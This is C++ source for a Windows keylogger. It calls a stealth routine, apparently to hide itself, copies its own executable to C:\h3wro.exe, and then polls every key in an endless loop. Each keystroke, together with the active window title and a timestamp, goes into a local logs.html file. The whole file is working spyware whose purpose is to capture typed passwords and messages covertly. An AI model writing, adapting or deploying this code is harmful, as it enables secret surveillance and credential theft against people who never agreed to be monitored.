#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <shlobj.h>

#include "Stealth.h"

HWND hCurrentWindow;
char sWindowTitle[256];
bool is_capslock = false;
int iBackspaceCounter = 0;

int save(int key)
{
	std::ofstream out_file;
	out_file.open("logs.html", std::ios_base::app);
	std::string sLogs = "";
	time_t t = time(0);

	if (hCurrentWindow != GetForegroundWindow())
	{
		hCurrentWindow = GetForegroundWindow();
		char title[256];
		GetWindowTextA(hCurrentWindow, title, sizeof(title));

		sLogs += "<font size=\"3\"><br><br><b>";
		sLogs += asctime(localtime(&t));
		sLogs += "<br>Window name: ";
		sLogs += title;
		sLogs += "]</b><br></font>";
	}

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0) {
		is_capslock = true;
	}

	switch (key) {
	case 1:
		return 0;
		break;
	case 2:
		return 0;
		break;
		//-----------------------------------------------------------------------
		//End of mouse
		//-----------------------------------------------------------------------
	case 96:
		iBackspaceCounter = 0;
		sLogs += "0";
		break;
	case 97:
		iBackspaceCounter = 0;
		sLogs += "1";
		break;
	case 98:
		iBackspaceCounter = 0;
		sLogs += "2";
		break;
	case 99:
		iBackspaceCounter = 0;
		sLogs += "3";
		break;
	case 100:
		iBackspaceCounter = 0;
		sLogs += "4";
		break;
	case 101:
		iBackspaceCounter = 0;
		sLogs += "5";
		break;
	case 102:
		iBackspaceCounter = 0;
		sLogs += "6";
		break;
	case 103:
		iBackspaceCounter = 0;
		sLogs += "7";
		break;
	case 104:
		iBackspaceCounter = 0;
		sLogs += "8";
		break;
	case 105:
		iBackspaceCounter = 0;
		sLogs += "9";
		break;
		//-----------------------------------------------------------------------
		//End of numpad digits
		//-----------------------------------------------------------------------
	case 48:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += ")";
		}
		else
			sLogs += "0";
		break;
	case 49:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "!";
		}
		else
			sLogs += "1";
		break;
	case 50:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "@";
		}
		else
			sLogs += "2";
		break;
	case 51:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "#";
		}
		else
			sLogs += "3";
		break;
	case 52:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "$";
		}
		else
			sLogs += "4";
		break;
	case 53:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "%";
		}
		else
			sLogs += "5";
		break;
	case 54:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "^";
		}
		else
			sLogs += "6";
		break;
	case 55:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "&";
		}
		else
			sLogs += "7";
		break;
	case 56:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "*";
		}
		else
			sLogs += "8";
		break;
	case 57:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "(";
		}
		else
			sLogs += "9";
		break;
		//-----------------------------------------------------------------------
		//End of digits
		//-----------------------------------------------------------------------
	case 65:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#260";
			}
			else
				sLogs += "A";
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#261";
			}
			else
				sLogs += "a";
		}
		break;
	case 66:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "B";
		}
		else
			sLogs += "b";
		break;
	case 67:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#262";
			}
			else {
				sLogs += "C";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#263";
			}
			else {
				sLogs += "c";
			}
		}
		break;
	case 68:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "D";
		}
		else
			sLogs += "d";
		break;
	case 69:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#280";
			}
			else {
				sLogs += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#281";
			}
			else {
				sLogs += "e";
			}
		}
		break;
	case 70:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "F";
		}
		else
			sLogs += "f";
		break;
	case 71:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "G";
		}
		else
			sLogs += "g";
		break;
	case 72:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "H";
		}
		else
			sLogs += "h";
		break;
	case 73:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "I";
		}
		else
			sLogs += "i";
		break;
	case 74:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "J";
		}
		else
			sLogs += "j";
		break;
	case 75:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "K";
		}
		else
			sLogs += "k";
		break;
	case 76:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#321";
			}
			else {
				sLogs += "L";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&322";
			}
			else {
				sLogs += "l";
			}
		}
		break;
	case 77:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "M";
		}
		else
			sLogs += "m";
		break;
	case 78:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#323";
			}
			else {
				sLogs += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#324";
			}
			else {
				sLogs += "n";
			}
		}
		break;
	case 79:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#211";
			}
			else {
				sLogs += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#243";
			}
			else {
				sLogs += "o";
			}
		}
		break;
	case 80:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "P";
			break;
		}
		else
			sLogs += "p";
		break;
	case 81:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Q";
			break;
		}
		else
			sLogs += "q";
		break;
	case 82:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "R";
			break;
		}
		else
			sLogs += "r";
		break;
	case 83:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#346";
			}
			else {
				sLogs += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#347";
			}
			else {
				sLogs += "s";
			}
		}
		break;
	case 84:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "T";
			break;
		}
		else
			sLogs += "t";
		break;
	case 85:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "�";
			}
			else {
				sLogs += "u";
			}
		}
		break;
	case 86:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "V";
			break;
		}
		else
			sLogs += "v";
		break;
	case 87:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "W";
			break;
		}
		else
			sLogs += "w";
		break;
	case 88:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#377";
			}
			else {
				sLogs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#378";
			}
			else {
				sLogs += "x";
			}
		}
		break;
	case 89:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Y";
			break;
		}
		else
			sLogs += "y";
		break;
	case 90:
		iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#379";
			}
			else {
				sLogs += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#380";
			}
			else {
				sLogs += "z";
			}
		}
		//-----------------------------------------------------------------------
		//End of A-Z characters
		//-----------------------------------------------------------------------
	case 13:
		iBackspaceCounter = 0;
		sLogs += "\n";
		break;
	case 20:
		iBackspaceCounter = 0;
		if (is_capslock == false) {
			is_capslock = true;
			sLogs += "<font size=\"1\">[CapsLock]</font>";
		}
		else {
			is_capslock = false;
			sLogs += "<font size=\"1\">[/CapsLock]</font>";
		}
		break;
	case VK_BACK:
		iBackspaceCounter += 1;
		sLogs += "<font size=\"1\">[";
		sLogs += iBackspaceCounter + '0';
		sLogs += "x";
		sLogs += "Backspace]</font>";
		break;
	case VK_SPACE:
		iBackspaceCounter = 0;
		sLogs += " ";
		break;
	case VK_MULTIPLY:
		iBackspaceCounter = 0;
		sLogs += "*";
		break;
	case VK_ADD:
		iBackspaceCounter = 0;
		sLogs += "+";
		break;
	case VK_SUBTRACT:
		iBackspaceCounter = 0;
		sLogs += "-";
		break;
	case VK_DECIMAL:
		iBackspaceCounter = 0;
		sLogs += ".";
		break;
	case VK_DIVIDE:
		iBackspaceCounter = 0;
		sLogs += "/";
		break;
	default:
		break;
	}

	out_file << sLogs;
	out_file.close();
	return 0;
}

using std::cout;
using std::endl;
int main(int argc, char * argv[]) {
	Stealth stealth;
	stealth.init();

	char buffer[MAX_PATH];
	::GetModuleFileNameA(NULL, buffer, MAX_PATH);

	//It swap / with //
	char sPath[MAX_PATH];
	int iIndexCounter = 0;
	for (int i = 0; i <= MAX_PATH; i++) {
		if (buffer[i] == '\\') {
			sPath[i + iIndexCounter] = '\\';
			iIndexCounter += 1;
			sPath[i + iIndexCounter] = '\\';
			continue;
		}
		sPath[i + iIndexCounter] = buffer[i];
	}

	char sDocumentsPath[MAX_PATH];
	HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, sDocumentsPath);
	char sDocumentsPathResult[MAX_PATH];

	//It swap / with //
	int iIndexCounterDoc = 0;
	for (int i = 0; i <= MAX_PATH; i++) {
		if (sDocumentsPath[i] == '\\') {
			sDocumentsPathResult[i + iIndexCounterDoc] = '\\';
			iIndexCounterDoc += 1;
			sDocumentsPathResult[i + iIndexCounterDoc] = '\\';
			continue;
		}
		sDocumentsPathResult[i + iIndexCounterDoc] = sDocumentsPath[i];
	}

	char sCompleteDocPath[MAX_PATH];
	strcpy(sCompleteDocPath, sDocumentsPathResult);
	//strcpy(sCompleteDocPath, "\\h3wro.exe");

	BOOL b = CopyFileA(sPath, "C:\\h3wro.exe", 0);
	if (!b) {
		cout << "Error: " << GetLastError() << endl;
	}
	else {
		cout << "Okey" << endl;
	}
	char i;
	while (1) {
		for (i = 8; i <= 222; i++) {
			if (GetAsyncKeyState(i) == -32767)
				save(i);
		}
	}
	return 0;
}